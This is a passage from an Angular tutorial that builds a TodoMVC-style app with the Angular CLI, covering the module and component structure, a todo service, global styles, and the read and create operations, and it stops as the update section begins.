<p>We are loading our <code>AppModule</code> into the browser platform. Now, let‚Äôs take a look at the <code>./app/app.module.ts</code> directory.</p>
<h2 id="App-directory">App directory<a href="#App-directory" class="headerlink" title="App directory"></a></h2><p>The app directory contains the components used to mount the rest of the application. In there the <code>&lt;app-root&gt;</code> that we so in the <code>index.html</code> is defined. Let‚Äôs start with <code>app.module</code></p>
<h3 id="app-module-ts">app.module.ts<a href="#app-module-ts" class="headerlink" title="app.module.ts"></a></h3><p>We are going to be using this file often. The most important part is the metadata inside the <code>@NgModule</code>. There we have <code>declarations</code>, <code>imports</code>, <code>providers</code> and <code>bootstrap</code>.</p>
<ul>
<li>Declarations: goes all your components (e.g., AppComponent, TodoComponent)</li>
<li>Imports: routes and modules go here.</li>
<li>Bootstrap: list the components you want to load when the app starts. In our case is <code>AppComponent</code>.</li>
</ul>
<h3 id="app-component-ts">app.component.ts<a href="#app-component-ts" class="headerlink" title="app.component.ts"></a></h3><p><code>AppComponent</code> looks a little similar to the app module, but instead of <code>@NgModule</code> we have <code>@Component</code>. Again, the most important part is the value of the attributes (metadata). We have <code>selector</code>, <code>templateUrl</code> and <code>styleUrls</code>:</p>
<ul>
<li><code>selector</code>: is the name of the component. Remember that we had <code>&lt;app-root&gt;Loading...&lt;/app-root&gt;</code>? AppComponent is where it‚Äôs defined.
<code>templateUrl</code>: This is where the HTML code is. <code>&lt;app-root&gt;</code> will be replaced for whatever you have in the template.</li>
<li><code>styleUrls</code>: You can have styles that only apply to this component. This is pretty neat! You can change the styles with confidence knowing that it won‚Äôt bleed into other parts of the website.</li>
</ul>
<p>Inside the <code>AppComponent</code> class you can define variables (e.g. <code>title</code>) that are used in the templates (e.g. <code>Angular Tutorial: Create a CRUD App with Angular CLI and TypeScript</code>).</p>
<blockquote>
<p>Let‚Äôs change the title from <code>Welcome to Angular Tutorial: Create a CRUD App with Angular CLI and TypeScript!</code> to <code>Angular Tutorial: Create a CRUD App with Angular CLI and TypeScript</code>. Also, remove everything else.</p>
</blockquote>
<p>Test your changes running:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ng serve ---port 9000</span><br></pre></td></tr></table></figure>
<p>You should see the new message.</p>
<p><a target="_blank" href="https://github.com/amejiarosario/angular-todo-app/commit/ec0b9f9">[changes diff]</a></p>
<h1 id="Creating-a-new-Component-with-Angular-CLI">Creating a new Component with Angular CLI<a href="#Creating-a-new-Component-with-Angular-CLI" class="headerlink" title="Creating a new Component with Angular CLI"></a></h1><p>Let‚Äôs create a new component to display the tasks. We can quickly create by typing:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ng generate component todo</span><br></pre></td></tr></table></figure>
<p>This command will create a new folder with four files:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create src/app/todo/todo.component.css</span><br><span class="line">create src/app/todo/todo.component.html</span><br><span class="line">create src/app/todo/todo.component.spec.ts</span><br><span class="line">create src/app/todo/todo.component.ts</span><br></pre></td></tr></table></figure>
<p>And it will add the new Todo component to the <code>AppModule</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE src/app/app.module.ts</span><br></pre></td></tr></table></figure>
<p>Go ahead and inspect each one. It will look similar to the app components.
Let ‚Äòs add our new component to the App component.</p>
<p><a target="_blank" href="https://github.com/amejiarosario/angular-todo-app/commit/bd5ec41">[changes diff]</a></p>
<p>Go to <code>src/app/app.component.html</code>, and replace everything with:</p>
<figure class="highlight html"><figcaption><span>src/app/app.component.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">app-todo</span>&gt;</span><span class="tag">&lt;/<span class="name">app-todo</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>If you have <code>ng serve</code> running, it should automatically update and show <code>todo works!</code></p>
<p><a target="_blank" href="https://github.com/amejiarosario/angular-todo-app/commit/8bcd39a">[changes diff]</a></p>
<h1 id="Todo-Template">Todo Template<a href="#Todo-Template" class="headerlink" title="Todo Template"></a></h1><p>‚Äútodo works!‚Äù is not useful. Let‚Äôs change that by adding some HTML code to represent our todo tasks. Go to the <code>src/app/todo/todo.component.html</code> file and copy-paste this HTML code:</p>
<figure class="highlight html"><figcaption><span>TodoTemplate src/app/todo/todo.component.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"todoapp"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">header</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Todo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"new-todo"</span> <span class="attr">placeholder</span>=<span class="string">"What needs to be done?"</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- This section should be hidden by default and shown when there are todos --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"todo-list"</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- These are here just to show the structure of the list items --&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- List items should get the class `editing` when editing and `completed` when marked as completed --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"completed"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"view"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"toggle"</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">checked</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span>Install angular-cli<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"destroy"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"edit"</span> <span class="attr">value</span>=<span class="string">"Create a TodoMVC template"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"view"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"toggle"</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span>Understand Angular2 apps<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"destroy"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"edit"</span> <span class="attr">value</span>=<span class="string">"Rule the web"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- This footer should hidden by default and shown when there are todos --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- This should be `0 items left` by default --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"todo-count"</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>0<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> item left<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Remove this if you don't implement routing --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"filters"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"selected"</span> <span class="attr">href</span>=<span class="string">"#/"</span>&gt;</span>All<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#/active"</span>&gt;</span>Active<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#/completed"</span>&gt;</span>Completed<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Hidden if no completed items are left ‚Üì --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"clear-completed"</span>&gt;</span>Clear completed<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>The above HTML code has the general structure about how we want to represent our tasks. Right now it has hard-coded todo‚Äôs. We are going to slowly turn it into a dynamic app using Angular data bindings.</p>
<p><a target="_blank" href="https://github.com/amejiarosario/angular-todo-app/commit/7dd4f78">[changes diff]</a></p>
<p>Next, let‚Äôs add some styling!</p>
<h1 id="Styling-the-todo-app">Styling the todo app<a href="#Styling-the-todo-app" class="headerlink" title="Styling the todo app"></a></h1><p>We are going to use a community maintained CSS for Todo apps. We can go ahead and download the CSS:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save todomvc-app-css</span><br></pre></td></tr></table></figure>
<p>This will install a CSS file that we can use to style our Todo app and make it look nice. In the next section, we are going to explain how to use it with the <code>angular-cli.json</code>.</p>
<h1 id="Adding-global-styles-to-angular-json">Adding global styles to angular.json<a href="#Adding-global-styles-to-angular-json" class="headerlink" title="Adding global styles to angular.json"></a></h1><p><code>angular.json</code> is a special file that tells the Angular CLI how to build your application. You can define how to name your root folder, tests and much more. What we care right now, is telling the angular CLI to use our new CSS file from the node modules. You can do it by adding the following line into the <code>styles</code> array:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"architect"</span>: &#123;</span><br><span class="line">  <span class="string">"build"</span>: &#123;</span><br><span class="line">    <span class="string">"options"</span>: &#123;</span><br><span class="line">      <span class="string">"styles"</span>: [</span><br><span class="line">        <span class="string">"src/styles.scss"</span>,</span><br><span class="line">        <span class="string">"node_modules/todomvc-app-css/index.css"</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">"scripts"</span>: []</span><br></pre></td></tr></table></figure>
<p>If you stop and start <code>ng serve</code>, then you will notice the changes.</p>
<img src="/images/angular2-todo-app-preview.png" title="Angular Todo App">
<p>We have the skeleton so far. Now we are going to make it dynamic and allow users to add/remove/update/sort tasks. We are going to do two versions one serverless and another one using a Node.js/Express server. We are going to be using promises all the time, so when we use a real API, the service is the only one that has to change.</p>
<p><a target="_blank" href="https://github.com/amejiarosario/angular-todo-app/commit/67ae866">[changes diff]</a></p>
<h1 id="Todo-Service">Todo Service<a href="#Todo-Service" class="headerlink" title="Todo Service"></a></h1><p>Let‚Äôs first start by creating a service that contains an initial list of tasks that we want to manage. We are going to use a <code>service</code> to manipulate the data. Let‚Äôs create the service with the CLI by typing:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ng g service todo/todo</span><br></pre></td></tr></table></figure>
<p>This will create two files:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create src/app/todo/todo.service.spec.ts</span><br><span class="line">create src/app/todo/todo.service.ts</span><br></pre></td></tr></table></figure>
<p><a target="_blank" href="https://github.com/amejiarosario/angular-todo-app/commit/c4fa45d">[changes diff]</a></p>
<h1 id="CRUD-Functionality">CRUD Functionality<a href="#CRUD-Functionality" class="headerlink" title="CRUD Functionality"></a></h1><p>For enabling the create-read-update-delete functionality, we are going to be modifying three files:</p>
<ul>
<li>src/app/todo/todo.<strong>service</strong>.ts</li>
<li>src/app/todo/todo.<strong>component</strong>.ts</li>
<li>src/app/todo/todo.component.<strong>html</strong></li>
</ul>
<p>Let‚Äôs get started!</p>
<h2 id="READ-Get-all-tasks">READ: Get all tasks<a href="#READ-Get-all-tasks" class="headerlink" title="READ: Get all tasks"></a></h2><p>Let‚Äôs modify the <code>todo.service</code> to be able to get tasks:</p>
<figure class="highlight js"><figcaption><span>TodoService src/app/todo/todo.service.ts</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Injectable &#125; <span class="keyword">from</span> <span class="string">'@angular/core'</span>;</span><br><span class="line"></span><br><span class="line marked"><span class="keyword">const</span> TODOS = [</span><br><span class="line marked">  &#123; <span class="attr">title</span>: <span class="string">'Install Angular CLI'</span>, <span class="attr">isDone</span>: <span class="literal">true</span> &#125;,</span><br><span class="line marked">  &#123; <span class="attr">title</span>: <span class="string">'Style app'</span>, <span class="attr">isDone</span>: <span class="literal">true</span> &#125;,</span><br><span class="line marked">  &#123; <span class="attr">title</span>: <span class="string">'Finish service functionality'</span>, <span class="attr">isDone</span>: <span class="literal">false</span> &#125;,</span><br><span class="line marked">  &#123; <span class="attr">title</span>: <span class="string">'Setup API'</span>, <span class="attr">isDone</span>: <span class="literal">false</span> &#125;,</span><br><span class="line marked">];</span><br><span class="line"></span><br><span class="line">@Injectable(&#123;</span><br><span class="line">  providedIn: <span class="string">'root'</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">TodoService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line marked">  <span class="keyword">constructor</span>() &#123; &#125;</span><br><span class="line marked"></span><br><span class="line marked">  get() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> resolve(TODOS));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Now we need to change our todo component to use the service that we created.</p>
<figure class="highlight js"><figcaption><span>TodoComponent src/app/todo/todo.component.ts</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component, OnInit &#125; <span class="keyword">from</span> <span class="string">'@angular/core'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; TodoService &#125; <span class="keyword">from</span> <span class="string">'./todo.service'</span>;</span><br><span class="line marked"></span><br><span class="line">@Component(&#123;</span><br><span class="line">  selector: <span class="string">'app-todo'</span>,</span><br><span class="line">  templateUrl: <span class="string">'./todo.component.html'</span>,</span><br><span class="line">  styleUrls: [<span class="string">'./todo.component.scss'</span>],</span><br><span class="line marked">  providers: [TodoService]</span><br><span class="line marked">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">TodoComponent</span> <span class="title">implements</span> <span class="title">OnInit</span> </span>&#123;</span><br><span class="line">  private todos;</span><br><span class="line marked">  private activeTasks;</span><br><span class="line marked"></span><br><span class="line marked">  <span class="keyword">constructor</span>(private todoService: TodoService) &#123; &#125;</span><br><span class="line marked"></span><br><span class="line marked">  getTodos()&#123;</span><br><span class="line marked">    <span class="keyword">return</span> <span class="keyword">this</span>.todoService.get().then(<span class="function"><span class="params">todos</span> =&gt;</span> &#123;</span><br><span class="line marked">      <span class="keyword">this</span>.todos = todos;</span><br><span class="line marked">      <span class="keyword">this</span>.activeTasks = <span class="keyword">this</span>.todos.filter(<span class="function"><span class="params">todo</span> =&gt;</span> todo.isDone).length;</span><br><span class="line marked">    &#125;);</span><br><span class="line marked">  &#125;</span><br><span class="line marked"></span><br><span class="line">  ngOnInit() &#123;</span><br><span class="line">    <span class="keyword">this</span>.getTodos();</span><br><span class="line marked">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The first change is importing our <code>TodoService</code> and adding it to the providers. Then we use the constructor of the component to load the <code>TodoService</code>. While we inject the service, we can hold a private instance of it in the variable <code>todoService</code>. Finally, we use it in the <code>getTodos</code> method. This will make a variable <code>todos</code> available in the template where we can render the tasks.</p>
<p>Let‚Äôs change the template so we can render the data from the service. Go to the <code>todo.component.html</code> and change what is inside the <code>&lt;ul class=&quot;todo-list&quot;&gt; ... &lt;/ul&gt;</code> for this one:</p>
<figure class="highlight html"><figcaption><span>TodoTemplate src/app/todo/todo.component.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"todo-list"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> *<span class="attr">ngFor</span>=<span class="string">"let todo of todos"</span> [<span class="attr">ngClass</span>]=<span class="string">"&#123;completed: todo.isDone&#125;"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"view"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"toggle"</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> [<span class="attr">checked</span>]=<span class="string">"todo.isDone"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span>&gt;</span>&#123;&#123;todo.title&#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"destroy"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"edit"</span> <span class="attr">value</span>=<span class="string">"&#123;&#123;todo.title&#125;&#125;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Also change the 32 in the template from:</p>
<figure class="highlight html"><figcaption><span>(partial) src/app/todo/todo.component.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"todo-count"</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>0<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> item left<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>replace it with:</p>
<figure class="highlight html"><figcaption><span>(partial) src/app/todo/todo.component.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"todo-count"</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>&#123;&#123;activeTasks&#125;&#125;<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> item left<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>When your browser updates you should have something like this:</p>
<img src="/images/angular2-todo-app-service.png" title="Todo app rendering tasks from service">
<p>Now, let‚Äôs go over what we just did. We can see that we added new data-binding into the template:</p>
<ul>
<li><code>*ngFor</code>: iterates through the <code>todos</code> array that we defined in the component and assigned in the <code>let todo</code> part.</li>
<li><code>[ngClass]</code>: applies a class when the expression evaluates to true. In our case, it uses class <code>completed</code> when <code>isDone</code> is true.</li>
<li><code>[checked]</code>: applies the <code>checked</code> attribute when the expression evaluates to true (<code>todo.isDone</code>).</li>
<li><code></code>: Render the todo title. The same happened with <code></code>.</li>
</ul>
<p><a target="_blank" href="https://github.com/amejiarosario/angular-todo-app/commit/876c331">[changes diff]</a></p>
<h2 id="CREATE-using-the-input-form">CREATE: using the input form<a href="#CREATE-using-the-input-form" class="headerlink" title="CREATE: using the input form"></a></h2><p>Let‚Äôs start with the template this time. We have an input element for creating new tasks. Let‚Äôs listen to changes in the input form and when we click enter it creates the TODO.</p>
<figure class="highlight html"><figcaption><span>Line 5 src/app/todo/todo.component.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"new-todo"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">placeholder</span>=<span class="string">"What needs to be done?"</span></span></span><br><span class="line"><span class="tag">       [(<span class="attr">ngModel</span>)]=<span class="string">"newTodo"</span></span></span><br><span class="line"><span class="tag">       (<span class="attr">keyup.enter</span>)=<span class="string">"addTodo()"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Notice that we are using a new variable called <code>newTodo</code> and method called <code>addTodo()</code>. Let‚Äôs go to the controller and give it some functionality:</p>
<figure class="highlight javascript"><figcaption><span>src/app/todo/todo.component.ts</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">private newTodo;</span><br><span class="line"></span><br><span class="line">addTodo()&#123;</span><br><span class="line">  <span class="keyword">this</span>.todoService.add(&#123; <span class="attr">title</span>: <span class="keyword">this</span>.newTodo, <span class="attr">isDone</span>: <span class="literal">false</span> &#125;).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getTodos();</span><br><span class="line">  &#125;).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.newTodo = <span class="string">''</span>; <span class="comment">// clear input form value</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>First, we created a private variable that we are going to use to get values from the input form. Then we created a new <code>todo</code> using the todo service method <code>add</code>. It doesn‚Äôt exist yet, so we are going to create it next:</p>
<figure class="highlight javascript"><figcaption><span>src/app/todo/todo.service.ts</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(data) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    TODOS.push(data);</span><br><span class="line">    resolve(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The above code adds the new element into the <code>todos</code> array and resolves the promise. That‚Äôs all. Go ahead a test it out creating a new todo element.</p>
<p>You might get an error saying:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can&apos;t bind to &apos;ngModel&apos; since it isn&apos;t a known property of &apos;input&apos;</span><br></pre></td></tr></table></figure>
<p>To use the two-way data binding you need to import <code>FormsModule</code> in the <code>app.module.ts</code>. So let‚Äôs do that.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; FormsModule &#125; <span class="keyword">from</span> <span class="string">'@angular/forms'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">@NgModule(&#123;</span><br><span class="line">  imports: [</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    FormsModule</span><br><span class="line">  ],</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>Now it should add new tasks to the list!</p>
<p><a target="_blank" href="https://github.com/amejiarosario/angular-todo-app/commit/049b52b4d823c62f922e5d6e5f386fa96cc6b0fe">[changes diff]</a></p>
<h2 id="UPDATE-on-double-click">UPDATE: on double click<a href="#UPDATE-on-double-click" class="headerlink" title="UPDATE: on double click"></a></h2><p>Let‚Äôs add an event listener to double-click on each todo. That way, we can change the content. Editing is tricky since we need to display an input form. Then when the user clicks enter it should update the value. Finally, it should hide the input and show the label with the updated value. Let‚Äôs do that by keeping a temp variable called <code>editing</code> which could be true or false.</p>
